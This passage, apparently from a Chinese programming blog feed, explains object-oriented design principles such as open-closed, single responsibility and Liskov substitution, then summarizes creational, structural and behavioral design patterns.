<h2 id="一-开放-封闭原则"><a href="#一-开放-封闭原则" class="headerlink" title="一.开放 - 封闭原则"></a>一.开放 - 封闭原则</h2><p>&emsp;&emsp;概念：一个软件实体如类、模块和函数应该<strong>对扩展开放，对修改关闭</strong>。模块应该尽量在不修改原代码的情况下进行扩展。<br>　　在软件周期内，因为变化、升级和维护等原因需要对软件原有代码进行修改时，可能会给代码引入错误，也可能会使我们不得不对整个功能进行重构，并且需要原有代码经过重新测试。当软件需求变化时，尽量通过扩展软件实体的行为来实现变化，而不是通过修改已有代码来实现变化。<br>　　开放封闭原则是面向对象设计的核心所在，遵循这个原则可以带来面向对象技术所声称的巨大好处，也就是<strong>可维护、可扩展、可复用、灵活性好</strong>。开发人员应该仅对程序中呈现的频繁变化的那些部分作出抽象，然而，对于应用程序中的每个部分都刻意的进行抽象同样不是一个好主意。拒绝不成熟的抽象和抽象本身一样重要。<br>　　注意事项：<br>　　1. 通过接口或者抽象类约束扩展，对扩展进行边界限定，不允许出现在接口或抽象类中不存在的 public 方法。<br>　　2. 参数类型、引用对象尽量使用接口或者抽象类，而不是实现类<br>　　3. 抽象层尽量保持稳定，一旦确定不允许修改。  </p>
<h2 id="二-单一职责原则"><a href="#二-单一职责原则" class="headerlink" title="二.单一职责原则"></a>二.单一职责原则</h2><p>&emsp;&emsp;概念：<strong>就一个类而言，应该仅有一个引起它变化的原因</strong>。<br>　　当我们在做编程的时候，很自然地会一个一个类加上各种各样的功能。这样意味着，<strong>无论任何需求要来，你都需要更改这个类</strong>，这样其实是很糟糕的，维护麻烦，复用不可能，也缺乏灵活性。如果一个类承担的职责过多，就等于把这些职责耦合起来，一个职责变化可能会削弱或者抑制这个类完成其他职责的能力。这种耦合会导致脆弱的设计，当变化发生时，设计会遭到很多意想不到的破坏。  </p>
<h2 id="三-依赖倒转原则"><a href="#三-依赖倒转原则" class="headerlink" title="三.依赖倒转原则"></a>三.依赖倒转原则</h2><p>&emsp;&emsp;概念：依赖倒转原则是程序要<strong>依赖于抽象接口，不要依赖于具体实现。简单的来说就是要求对抽象进行编程，不要对实现进行编程</strong>，这样就降低了客户与实现模块的耦合。<br>　　有时候为了代码复用，一般会把常用的代码写成函数或类库。这样开发新项目的时候直接用就行了。比如做项目的时候大多要访问数据库，所以我们把访问数据库的代码写成了函数。每次做项目去调用这些函数。那么问题来了，我们要做新项目的时候，发现业务逻辑高层模块都是一样的，但客户却希望使用不同的数据库或存储方式，这时就出现了麻烦。我们希望能再次利用这些高层模块，但是高层模块都是与低层的访问数据库绑定在一起，没办法复用这些高层的模块。所以不管是高层模块和底层模块都应该依赖于抽象，具体一点就是接口或者抽象类，只要接口是稳定的，那么任何一个更改都不用担心。<br>　　注意事项：<br>　　1. 高层模块不应该依赖于低层模块。两个都应该依赖抽象。<br>　　2. 抽象不应该依赖细节。细节应依赖于抽象。  </p>
<h2 id="四-迪米特法则（也称为最少知识原则）"><a href="#四-迪米特法则（也称为最少知识原则）" class="headerlink" title="四.迪米特法则（也称为最少知识原则）"></a>四.迪米特法则（也称为最少知识原则）</h2><p>&emsp;&emsp;概念：一个软件实体应当尽可能地少与其他实体发生相互作用。每一个软件单位对其他软件单位都只有最少的知识，而且局限于那些与本单位密切相关的软件单位。迪米特法则的初衷在于降低类之间的耦合。由于每个类尽量减少对其他类的依赖，因此，很容易使得系统的功能模块功能独立，相互之间不存在（或很少有）依赖关系。迪米特法则不希望类之间建立直接的联系。如果有真的需要建立联系的，也希望能通过他的友元类来转达。因此，应用迪米特法则有可能造成一个后果就是：系统中存在大量的中介类，这些类之所以存在完全是为了传递类之间的相互关系，这在一定程度上增加了系统的复杂度。  </p>
<h2 id="五-接口隔离原则"><a href="#五-接口隔离原则" class="headerlink" title="五.接口隔离原则"></a>五.接口隔离原则</h2><p>&emsp;&emsp;概念：客户端不应该依赖他不需要的接口，类间的依赖关系应建立在最小的接口上。<br>　　接口隔离原则的核心定义，<strong>不出现臃肿的接口</strong>，但是“小”是有限度的，首先就是不能违反单一职责原则。  </p>
<h2 id="六-合成-聚合复用原则"><a href="#六-合成-聚合复用原则" class="headerlink" title="六.合成 / 聚合复用原则"></a>六.合成 / 聚合复用原则</h2><p>&emsp;&emsp;概念：合成 / 聚合复用原则经常又叫做合成复用原则，就是在一个新的对象里面使用一些已有的对象，使之成为新对象的一部分，新的对象通过这些对象的委派达到复用已有功能的目的。他的设计原则是：<strong>要尽量使用合成 / 聚合，尽量不要使用继承</strong>。  </p>
<h2 id="七-里氏代换原则"><a href="#七-里氏代换原则" class="headerlink" title="七.里氏代换原则"></a>七.里氏代换原则</h2><p>&emsp;&emsp;概念：里氏代换原则是面向对象设计的基本原则之一。即任何基类可以出现的地方，子类一定可以出现。里氏代换原则是继承复用的基石，只有当衍生类可以替换掉基类，软件单位的功能不受影响时，基类才能被真正复用，而衍生类也能够在积累的基础上增加新的行为，里氏代换原则是对 “ 开 - 闭 ” 原则的补充。实现 “ 开 - 闭 ” 原则的关键步骤就是抽象化。在基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。<br>　　当满足继承的时候，父类肯定存在非私有的成员，子类肯定是得到了父类的这些非私有成员（假设，父类的成员全部是私有的，那么子类没办法从父类继承任何成员，也就不存在继承的额概念了）。既然子类继承了父类的这些非私有成员，那么父类对象也就可以在子类对象中调用这些非私有成员。所以，子类对象可以替换父类对象的位置。<br>　　在里氏代换原则下，<strong>当需求有变化时，只需继承，而别的东西不会改变</strong>。由于里氏代换原则才使得开放封闭称为可能。这样使得子类在父类无需修改就可以扩展。  </p>
<h1 id="第二篇"><a href="#第二篇" class="headerlink" title="第二篇"></a>第二篇</h1><h2 id="1-开闭原则-Open-Closed-Principle-OCP"><a href="#1-开闭原则-Open-Closed-Principle-OCP" class="headerlink" title="1. 开闭原则(Open-Closed Principle, OCP)"></a>1. 开闭原则(Open-Closed Principle, OCP)</h2><p>&emsp;&emsp;<strong>定义：一个软件实体如类、模块和函数应该对扩展开放，对修改关闭。</strong><br>&emsp;&emsp;<strong>个人解释</strong>：软件实体如同你租住的房子一般，你可以向里面添加东西，但是却很难修改这个房间。<strong>扩展开放</strong>就相当于你向租住的房子里放置家具，充实这个房子的功能。<strong>修改关闭</strong>就好比是房子的已经存在的物件，道理上你是没有这个改变他们的能力，实际是你在付出代价之后可以更改。<strong>但</strong>绝对的修改关闭是不可能的。就好比如水龙头、下水管道、灯泡等这些房子存在的基本物件损坏一样，不可避免的，所以需要提前做好准备避免。而在软件中避免就是<strong>创建抽象来隔离以后发生同类的变化</strong>。<br>&emsp;&emsp;<strong>开放-封闭原则，可以保证以前代码的正确性，因为没有修改以前代码，所以可以保证开发人员专注于将设计放在新扩展的代码上。</strong><br>&emsp;&emsp;简单的用一句经典的话来说：过去的事已成历史，是不可修改的，因为时光不可倒流，但现在或明天计划做什么，是可以自己决定（即扩展）的。  </p>
<h2 id="2-单一职责原则（Single-Responsibility-Principle）"><a href="#2-单一职责原则（Single-Responsibility-Principle）" class="headerlink" title="2. 单一职责原则（Single Responsibility Principle）"></a>2. 单一职责原则（Single Responsibility Principle）</h2><p>&emsp;&emsp;<strong>定义：即一个类只负责一项职责，应该仅有一个引起它变化的原因。</strong><br>&emsp;&emsp;<strong>个人解释</strong>：你有一个带茶漏的茶杯（即类）用来喝茶和喝水（即两种职责）。有一天你想将奶茶倒入这个茶杯，但由于奶茶有珍珠，茶杯有茶漏，为了将珍珠也放入茶杯中，你将茶漏取出（改变了茶杯的功能），此时的茶杯就不能用来喝茶，所以该茶杯的职责也就被改变。为了避免这种改变你准备了茶杯和水杯，喝茶就用茶杯，喝水就用水杯。这就符合单一职责原则，一个类（杯子）只负责一种职责（喝茶或者喝水）。  </p>
<p>&emsp;&emsp;<strong>单一职责的优点</strong>：  </p>
<ol>
<li>可以降低类的复杂度，一个类只负责一项职责，其逻辑肯定要比负责多项职责简单的多；  </li>
<li>提高类的可读性，提高系统的可维护性；  </li>
<li>变更引起的风险降低，变更是必然的，如果单一职责原则遵守的好，当修改一个功能时，可以显著降低对其他功能的影响。  </li>
</ol>
<p>&emsp;&emsp;<strong>需要说明的一点</strong>是单一职责原则不只是面向对象编程思想所特有的，只要是模块化的程序设计，都需要遵循这一重要原则。  </p>
<h2 id="3-里氏替换原则（Liskov-Substitution-Principle）"><a href="#3-里氏替换原则（Liskov-Substitution-Principle）" class="headerlink" title="3. 里氏替换原则（Liskov Substitution Principle）"></a>3. 里氏替换原则（Liskov Substitution Principle）</h2><p>&emsp;&emsp;<strong>定义：子类型必须能够替换掉它们的父类型。</strong><br>&emsp;&emsp;<strong>个人解释</strong>：如果父类型是鸟，子类型是企鹅，在生物学中企鹅归属于鸟，但是企鹅不会飞，在编程的世界中，企鹅就无法归属于鸟，即企鹅不能继承鸟类。<br>&emsp;&emsp;只有当子类可以替换掉父类，软件单位的功能不受影响时，父类才能真正被复用，而子类也能够在父类的基础上增加新的行为。<br>&emsp;&emsp;正是有里氏代换原则，使得继承复用成为了可能。<strong>正是由于子类型的可替换性才使得使用父类类型的模块在无需修改的情况下就可以扩展，不然还谈什么扩展开放，修改关闭呢？</strong><br>&emsp;&emsp;<strong>里氏替换原则通俗的来讲就是</strong>：子类可以扩展父类的功能，但不能改变父类原有的功能。  </p>
<p>&emsp;&emsp;<strong>它包含以下4层含义：</strong>  </p>
<ol>
<li><strong>子类可以实现父类的抽象方法，但不能覆盖父类的非抽象方法。</strong>  </li>
<li><strong>子类中可以增加自己特有的方法。</strong>  </li>
<li><strong>当子类的方法重载父类的方法时，方法的前置条件（即方法的形参）要比父类方法的输入参数更宽松。</strong>  </li>
<li><strong>当子类的方法实现父类的抽象方法时，方法的后置条件（即方法的返回值）要比父类更严格。</strong>  </li>
</ol>
<h2 id="4-迪米特法则（Law-Of-Demeter）"><a href="#4-迪米特法则（Law-Of-Demeter）" class="headerlink" title="4. 迪米特法则（Law Of Demeter）"></a>4. 迪米特法则（Law Of Demeter）</h2><p>&emsp;&emsp;<strong>定义：迪米特法则又叫最少知道原则，即一个对象应该对其他对象保持最少的了解。</strong><br>&emsp;&emsp;<strong>解释</strong>：迪米特法则其根本思想是强调了类之间的松耦合。类之间的耦合越弱，越有利于复用，一个处在弱耦合的类被修改，不会对有关系的类造成影响，也就是说信息的隐藏促进了软件的复用。<br>&emsp;&emsp;软件编程的总的原则：低耦合，高内聚。无论是面向过程编程还是面向对象编程，只有使各个模块之间的耦合尽量的低，才能提高代码的复用率。而迪米特法则就是解决低耦合的方法。<br>&emsp;&emsp;<strong>个人解释</strong>：迪米特法则有个简单的方法叫做：只与直接的朋友通信。朋友关系在编程中就是耦合关系，耦合的方式就像现实世界中交朋友一样有多种，例如：依赖，关联，组合，聚合等。其中，我们称出现成员变量、方法参数、方法返回值中的类为直接的朋友，而出现在局部变量中的类则不是直接的朋友。也就是说，陌生的类最好不要作为局部变量的形式出现在类的内部。  </p>
<h2 id="5-依赖倒置原则（Dependence-Inversion-Principle）"><a href="#5-依赖倒置原则（Dependence-Inversion-Principle）" class="headerlink" title="5. 依赖倒置原则（Dependence Inversion Principle）"></a>5. 依赖倒置原则（Dependence Inversion Principle）</h2><p>&emsp;&emsp;<strong>定义：高层模块不应该依赖低层模块，二者都应该依赖其抽象；抽象不应该依赖细节；细节应该依赖抽象。中心思想是面向接口编程。</strong>  </p>
<p>&emsp;&emsp;在实际编程中，我们一般需要做到如下3点：  </p>
<ol>
<li>低层模块尽量都要有抽象类或接口，或者两者都有。  </li>
<li>变量的声明类型尽量是抽象类或接口。  </li>
<li>使用继承时遵循里氏替换原则。  </li>
</ol>
<p>&emsp;&emsp;<strong>依赖倒置原则基于这样一个事实：相对于细节的多变性，抽象的东西要稳定的多。以抽象为基础搭建起来的架构比以细节为基础搭建起来的架构要稳定的多。在java中，抽象指的是接口或者抽象类，细节就是具体的实现类，使用接口或者抽象类的目的是制定好规范和契约，而不去涉及任何具体的操作，把展现细节的任务交给他们的实现类去完成。</strong>  </p>
<h2 id="6-接口隔离原则（Interface-Segregation-Principle）"><a href="#6-接口隔离原则（Interface-Segregation-Principle）" class="headerlink" title="6. 接口隔离原则（Interface Segregation Principle）"></a>6. 接口隔离原则（Interface Segregation Principle）</h2><p>&emsp;&emsp;<strong>定义：我们要为各个类建立专用的接口，而不要试图去建立一个很庞大的接口供所有依赖它的类去调用。</strong><br>&emsp;&emsp;<strong>解释</strong>：在程序设计中，依赖几个专用的接口要比依赖一个综合的接口更灵活。就好比术业有专攻一样。通过分散定义多个接口，可以预防外来变更的扩散，提高系统的灵活性和可维护性。  </p>
<p>&emsp;&emsp;采用接口隔离原则对接口进行约束时，要注意以下几点：  </p>
<ol>
<li>接口尽量小，但是要有限度。对接口进行细化可以提高程序设计灵活性是不挣的事实，但是如果过小，则会造成接口数量过多，使设计复杂化。所以一定要适度。  </li>
<li>为依赖接口的类定制服务，只暴露给调用的类它需要的方法，它不需要的方法则隐藏起来。只有专注地为一个模块提供定制服务，才能建立最小的依赖关系。  </li>
<li>提高内聚，减少对外交互。使接口用最少的方法去完成最多的事情。  </li>
</ol>
<p>&emsp;&emsp;<strong>运用接口隔离原则，一定要适度，接口设计的过大或过小都不好。设计接口的时候，只有多花些时间去思考和筹划，才能准确地实践这一原则。</strong>  </p>
<h2 id="7-合成-聚合原则-Composite-Aggregate-Reuse-Principle-CARP"><a href="#7-合成-聚合原则-Composite-Aggregate-Reuse-Principle-CARP" class="headerlink" title="7. 合成/聚合原则(Composite/Aggregate Reuse Principle,CARP)"></a>7. 合成/聚合原则(Composite/Aggregate Reuse Principle,CARP)</h2><p>&emsp;&emsp;<strong>定义：尽量的使用合成和聚合，而不是继承关系达到复用的目的。换句话说，就是能用合成/聚合的地方，绝不用继承。</strong>  </p>
<p>&emsp;&emsp;<strong>为什么要尽量使用合成/聚合而不使用类继承？</strong>  </p>
<ol>
<li>对象的继承关系在编译时就定义好了，所以无法在运行时改变从父类继承的子类的实现  </li>
<li>子类的实现和它的父类有非常紧密的依赖关系，以至于父类实现中的任何变化必然会导致子类发生变化  </li>
<li>当你复用子类的时候，如果继承下来的实现不适合解决新的问题，则父类必须重写或者被其它更适合的类所替换，这种依赖关系限制了灵活性，并最终限制了复用性。  </li>
</ol>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[设计模式]]></title>
      <url>/2019/08/30/DesignPatterns/</url>
      <content type="html"><![CDATA[<blockquote>
<p>简介：<a href="https://www.cnblogs.com/www-zsl187-com/p/8834734.html" target="_blank" rel="noopener">https://www.cnblogs.com/www-zsl187-com/p/8834734.html</a><br>正文：<a href="https://www.cnblogs.com/zhili/p/DesignPatternSummery.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhili/p/DesignPatternSummery.html</a>  </p>
</blockquote>
<p>一、创建型模式<br>1、抽象工厂模式(Abstract factory pattern): 提供一个接口, 用于创建相关或依赖对象的家族, 而不需要指定具体类.<br>2、生成器模式(Builder pattern): 使用生成器模式封装一个产品的构造过程, 并允许按步骤构造. 将一个复杂对象的构建与它的表示分离, 使得同样的构建过程可以创建不同的表示.<br>3、工厂模式(factory method pattern): 定义了一个创建对象的接口, 但由子类决定要实例化的类是哪一个. 工厂方法让类把实例化推迟到子类.<br>4、原型模式(prototype pattern): 当创建给定类的实例过程很昂贵或很复杂时, 就使用原型模式.<br>5、单例模式(Singleton pattern): 确保一个类只有一个实例, 并提供全局访问点.<br>6、多例模式(Multition pattern): 在一个解决方案中结合两个或多个模式, 以解决一般或重复发生的问题.<br>二、结构型模式<br>1、适配器模式(Adapter pattern): 将一个类的接口, 转换成客户期望的另一个接口. 适配器让原本接口不兼容的类可以合作无间. 对象适配器使用组合, 类适配器使用多重继承.<br>2、桥接模式(Bridge pattern): 使用桥接模式通过将实现和抽象放在两个不同的类层次中而使它们可以独立改变.<br>3、组合模式(composite pattern): 允许你将对象组合成树形结构来表现”整体/部分”层次结构. 组合能让客户以一致的方式处理个别对象以及对象组合.<br>4、装饰者模式(decorator pattern): 动态地将责任附加到对象上, 若要扩展功能, 装饰者提供了比继承更有弹性的替代方案.<br>5、外观模式(facade pattern): 提供了一个统一的接口, 用来访问子系统中的一群接口. 外观定义了一个高层接口, 让子系统更容易使用.<br>6、亨元模式(Flyweight Pattern): 如想让某个类的一个实例能用来提供许多”虚拟实例”, 就使用蝇量模式.<br>7、代理模式(Proxy pattern): 为另一个对象提供一个替身或占位符以控制对这个对象的访问.<br>三、行为型模式<br>1、责任链模式(Chain of responsibility pattern): 通过责任链模式, 你可以为某个请求创建一个对象链. 每个对象依序检查此请求并对其进行处理或者将它传给链中的下一个对象.<br>2、命令模式(Command pattern): 将”请求”封闭成对象, 以便使用不同的请求,队列或者日志来参数化其他对象. 命令模式也支持可撤销的操作.<br>3、解释器模式(Interpreter pattern): 使用解释器模式为语言创建解释器.<br>4、迭代器模式(iterator pattern): 提供一种方法顺序访问一个聚合对象中的各个元素, 而又不暴露其内部的表示.<br>5、中介者模式(Mediator pattern) : 使用中介者模式来集中相关对象之间复杂的沟通和控制方式.<br>6、备忘录模式(Memento pattern): 当你需要让对象返回之前的状态时(例如, 你的用户请求”撤销”), 你使用备忘录模式.<br>7、观察者模式(observer pattern): 在对象之间定义一对多的依赖, 这样一来, 当一个对象改变状态, 依赖它的对象都会收到通知, 并自动更新.<br>8、状态模式(State pattern): 允许对象在内部状态改变时改变它的行为, 对象看起来好象改了它的类.<br>9、策略模式(strategy pattern): 定义了算法族, 分别封闭起来, 让它们之间可以互相替换, 此模式让算法的变化独立于使用算法的客户.<br>10、模板方法模式(Template pattern): 在一个方法中定义一个算法的骨架, 而将一些步骤延迟到子类中. 模板方法使得子类可以在不改变算法结构的情况下, 重新定义算法中的某些步骤.<br>11、访问者模式(visitor pattern): 当你想要为一个对象的组合增加新的能力, 且封装并不重要时, 就使用访问者模式.  </p>
<a id="more"></a>

<h1 id="一、创建型模式"><a href="#一、创建型模式" class="headerlink" title="一、创建型模式"></a>一、创建型模式</h1><p>&emsp;&emsp;创建型模式就是用来创建对象的模式，抽象了实例化的过程。所有的创建型模式都有两个共同点。第一，它们都将系统使用哪些具体类的信息封装起来；第二，它们隐藏了这些类的实例是如何被创建和组织的。创建型模式包括单例模式、工厂方法模式、抽象工厂模式、建造者模式和原型模式。  </p>
<ul>
<li>单例模式：解决的是实例化对象的个数的问题，比如抽象工厂中的工厂、对象池等，除了Singleton之外，其他创建型模式解决的都是 new 所带来的耦合关系。  </li>
<li>抽象工厂：创建一系列相互依赖对象，并能在运行时改变系列。  </li>
<li>工厂方法：创建单个对象，在Abstract Factory有使用到。  </li>
<li>原型模式：通过拷贝原型来创建新的对象。  </li>
</ul>
<p>&emsp;&emsp;工厂方法、抽象工厂、建造者都需要一个额外的工厂类来负责实例化“一个对象”，而Prototype则是通过原型（一个特殊的工厂类）来克隆“易变对象”。<br>&emsp;&emsp;下面详细介绍下它们。  </p>
<h2 id="1-1-单例模式"><a href="#1-1-单例模式" class="headerlink" title="1.1  单例模式"></a>1.1  单例模式</h2><p>&emsp;&emsp;单例模式指的是确保某一个类只有一个实例，并提供一个全局访问点。解决的是实体对象个数的问题，而其他的建造者模式都是解决new所带来的耦合关系问题。其实现要点有：  </p>
<ul>
<li>类只有一个实例。问：如何保证呢？答：通过私有构造函数来保证类外部不能对类进行实例化  </li>
<li>提供一个全局的访问点。问：如何实现呢？答：创建一个返回该类对象的静态方法  </li>
</ul>
<p>&emsp;&emsp;单例模式的结构图如下所示：  </p>
<p><img src="%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.gif" alt=" "></p>
<h2 id="1-2-工厂方法模式"><a href="#1-2-工厂方法模式" class="headerlink" title="1.2 工厂方法模式"></a>1.2 工厂方法模式</h2><p>&emsp;&emsp;工厂方法模式指的是定义一个创建对象的工厂接口，由其子类决定要实例化的类，将实际创建工作推迟到子类中。它强调的是”单个对象“的变化。其实现要点有：  </p>
<ul>
<li>定义一个工厂接口。问：如何实现呢？答：声明一个工厂抽象类  </li>
<li>由其具体子类创建对象。问：如何去实现呢？答：创建派生于工厂抽象类，即由具体工厂去创建具体产品，既然要创建产品，自然需要产品抽象类和具体产品类了。  </li>
</ul>
<p>&emsp;&emsp;其具体的UML结构图如下所示：  </p>
<p><img src="%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<p>&emsp;&emsp;在工厂方法模式中，工厂类与具体产品类具有平行的等级结构，它们之间是一一对应关系。  </p>
<h2 id="1-3-抽象工厂模式"><a href="#1-3-抽象工厂模式" class="headerlink" title="1.3 抽象工厂模式"></a>1.3 抽象工厂模式</h2><p>&emsp;&emsp;抽象工厂模式指的是提供一个创建一系列相关或相互依赖对象的接口，使得客户端可以在不必指定产品的具体类型的情况下，创建多个产品族中的产品对象，强调的是”系列对象“的变化。其实现要点有：  </p>
<ul>
<li>提供一系列对象的接口。问：如何去实现呢？答：提供多个产品的抽象接口  </li>
<li>创建多个产品族中的多个产品对象。问：如何做到呢？答：每个具体工厂创建一个产品族中的多个产品对象，多个具体工厂就可以创建多个产品族中的多个对象了。  </li>
</ul>
<p>&emsp;&emsp;具体的UML结构图如下所示：  </p>
<p><img src="%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F.gif" alt=" "></p>
<h2 id="1-4-建造者模式"><a href="#1-4-建造者模式" class="headerlink" title="1.4 建造者模式"></a>1.4 建造者模式</h2><p>&emsp;&emsp;建造者模式指的是将一个产品的内部表示与产品的构造过程分割开来，从而可以使一个建造过程生成具体不同的内部表示的产品对象。强调的是产品的构造过程。其实现要点有：  </p>
<ul>
<li>将产品的内部表示与产品的构造过程分割开来。问：如何把它们分割开呢？答：不要把产品的构造过程放在产品类中，而是由建造者类来负责构造过程，产品的内部表示放在产品类中，这样不就分割开了嘛。  </li>
</ul>
<p>&emsp;&emsp;具体的UML结构图如下所示：  </p>
<p><img src="%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h2 id="1-5-原型工厂模式"><a href="#1-5-原型工厂模式" class="headerlink" title="1.5 原型工厂模式"></a>1.5 原型工厂模式</h2><p>&emsp;&emsp;原型模式指的是通过给出一个原型对象来指明所要创建的对象类型，然后用复制的方法来创建出更多的同类型对象。其实现要点有：  </p>
<ul>
<li>给出一个原型对象。问：如何办到呢？答：很简单嘛，直接给出一个原型类就好了。  </li>
<li>通过复制的方法来创建同类型对象。问：又是如何实现呢？答：.NET可以直接调用MemberwiseClone方法来实现浅拷贝  </li>
</ul>
<p>&emsp;&emsp;具体的UML结构图如下所示：  </p>
<p><img src="%E5%8E%9F%E5%9E%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h1 id="二、结构型模式"><a href="#二、结构型模式" class="headerlink" title="二、结构型模式"></a>二、结构型模式</h1><p>&emsp;&emsp;结构型模式，顾名思义讨论的是类和对象的结构 ，主要用来处理类或对象的组合。它包括两种类型，一是类结构型模式，指的是采用继承机制来组合接口或实现；二是对象结构型模式，指的是通过组合对象的方式来实现新的功能。它包括适配器模式、桥接模式、装饰者模式、组合模式、外观模式、享元模式和代理模式。  </p>
<ul>
<li>适配器模式注重转换接口，将不吻合的接口适配对接   </li>
<li>桥接模式注重分离接口与其实现，支持多维度变化   </li>
<li>组合模式注重统一接口，将“一对多”的关系转化为“一对一”的关系   </li>
<li>装饰者模式注重稳定接口，在此前提下为对象扩展功能   </li>
<li>外观模式注重简化接口，简化组件系统与外部客户程序的依赖关系   </li>
<li>享元模式注重保留接口，在内部使用共享技术对对象存储进行优化   </li>
<li>代理模式注重假借接口，增加间接层来实现灵活控制  </li>
</ul>
<h2 id="2-1-适配器模式"><a href="#2-1-适配器模式" class="headerlink" title="2.1 适配器模式"></a>2.1 适配器模式</h2><p>&emsp;&emsp;适配器模式意在转换接口，它能够使原本不能在一起工作的两个类一起工作，所以经常用来在类库的复用、代码迁移等方面。例如DataAdapter类就应用了适配器模式。适配器模式包括类适配器模式和对象适配器模式，具体结构如下图所示，左边是类适配器模式，右边是对象适配器模式。  </p>
<p><img src="%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F.jpg" alt=" "></p>
<h2 id="2-2-桥接模式"><a href="#2-2-桥接模式" class="headerlink" title="2.2 桥接模式"></a>2.2 桥接模式</h2><p>&emsp;&emsp;桥接模式旨在将抽象化与实现化解耦，使得两者可以独立地变化。意思就是说，桥接模式把原来基类的实现化细节再进一步进行抽象，构造到一个实现化的结构中，然后再把原来的基类改造成一个抽象化的等级结构，这样就可以实现系统在多个维度的独立变化，桥接模式的结构图如下所示。  </p>
<p><img src="%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.gif" alt=" "></p>
<h2 id="2-3-装饰者模式"><a href="#2-3-装饰者模式" class="headerlink" title="2.3 装饰者模式"></a>2.3 装饰者模式</h2><p>&emsp;&emsp;装饰者模式又称包装（Wrapper）模式，它可以动态地给一个对象添加一些额外的功能，装饰者模式较继承生成子类的方式更加灵活。虽然装饰者模式能够动态地将职责附加到对象上，但它也会造成产生一些细小的对象，增加了系统的复杂度。具体的结构图如下所示。  </p>
<p><img src="%E8%A3%85%E9%A5%B0%E8%80%85%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h2 id="2-4-组合模式"><a href="#2-4-组合模式" class="headerlink" title="2.4 组合模式"></a>2.4 组合模式</h2><p>&emsp;&emsp;组合模式又称为部分—整体模式。组合模式将对象组合成树形结构，用来表示整体与部分的关系。组合模式使得客户端将单个对象和组合对象同等对待。如在.NET中WinForm中的控件，TextBox、Label等简单控件继承与Control类，同时GroupBox这样的组合控件也是继承于Control类。组合模式的具体结构图如下所示。  </p>
<p><img src="%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F.gif" alt=" "></p>
<h2 id="2-5-外观模式"><a href="#2-5-外观模式" class="headerlink" title="2.5 外观模式"></a>2.5 外观模式</h2><p>&emsp;&emsp;在系统中，客户端经常需要与多个子系统进行交互，这样导致客户端会随着子系统的变化而变化，此时可以使用外观模式把客户端与各个子系统解耦。外观模式指的是为子系统中的一组接口提供一个一致的门面，它提供了一个高层接口，这个接口使子系统更加容易使用。如电信的客户专员，你可以让客户专员来完成冲话费，修改套餐等业务，而不需要自己去与各个子系统进行交互。具体类结构图如下所示：  </p>
<p><img src="%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F.gif" alt=" "></p>
<h2 id="2-6-享元模式"><a href="#2-6-享元模式" class="headerlink" title="2.6 享元模式"></a>2.6 享元模式</h2><p>&emsp;&emsp;在系统中，如何我们需要重复使用某个对象时，此时如果重复地使用new操作符来创建这个对象的话，这对系统资源是一个极大的浪费，既然每次使用的都是同一个对象，为什么不能对其共享呢？这也是享元模式出现的原因。<br>&emsp;&emsp;享元模式运用共享的技术有效地支持细粒度的对象，使其进行共享。在.NET类库中，String类的实现就使用了享元模式，String类采用字符串驻留池的来使字符串进行共享。更多内容参考博文：<a href="http://www.cnblogs.com/artech/archive/2010/11/25/internedstring.html" target="_blank" rel="noopener">http://www.cnblogs.com/artech/archive/2010/11/25/internedstring.html</a> 。享元模式的具体结构图如下所示。  </p>
<p><img src="%E4%BA%A8%E5%85%83%E6%A8%A1%E5%BC%8F.gif" alt=" "></p>
<h2 id="2-7-代理模式"><a href="#2-7-代理模式" class="headerlink" title="2.7 代理模式"></a>2.7 代理模式</h2><p>&emsp;&emsp;在系统开发中，有些对象由于网络或其他的障碍，以至于不能直接对其访问，此时可以通过一个代理对象来实现对目标对象的访问。如.NET中的调用Web服务等操作。<br>&emsp;&emsp;代理模式指的是给某一个对象提供一个代理，并由代理对象控制对原对象的访问。具体的结构图如下所示。  </p>
<p><img src="%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F.gif" alt=" "></p>
<p>&emsp;&emsp;注：外观模式、适配器模式和代理模式区别？<br>&emsp;&emsp;解答：这三个模式的相同之处是，它们都是作为客户端与真实被使用的类或系统之间的一个中间层，起到让客户端间接调用真实类的作用，不同之处在于，所应用的场合和意图不同。<br>&emsp;&emsp;代理模式与外观模式主要区别在于，代理对象无法直接访问对象，只能由代理对象提供访问，而外观对象提供对各个子系统简化访问调用接口，而适配器模式则不需要虚构一个代理者，目的是复用原有的接口。外观模式是定义新的接口，而适配器则是复用一个原有的接口。<br>&emsp;&emsp;另外，它们应用设计的不同阶段，外观模式用于设计的前期，因为系统需要前期就需要依赖于外观，而适配器应用于设计完成之后，当发现设计完成的类无法协同工作时，可以采用适配器模式。然而很多情况下在设计初期就要考虑适配器模式的使用，如涉及到大量第三方应用接口的情况；代理模式是模式完成后，想以服务的方式提供给其他客户端进行调用，此时其他客户端可以使用代理模式来对模块进行访问。<br>&emsp;&emsp;总之，代理模式提供与真实类一致的接口，旨在用来代理类来访问真实的类，外观模式旨在简化接口，适配器模式旨在转换接口。  </p>
<h1 id="三、行为型模式"><a href="#三、行为型模式" class="headerlink" title="三、行为型模式"></a>三、行为型模式</h1><p>&emsp;&emsp;行为型模式是对在不同对象之间划分责任和算法的抽象化。行为模式不仅仅关于类和对象，还关于它们之间的相互作用。行为型模式又分为类的行为模式和对象的行为模式两种。  </p>
<ul>
<li>类的行为模式——使用继承关系在几个类之间分配行为。  </li>
<li>对象的行为模式——使用对象聚合的方式来分配行为。  </li>
</ul>
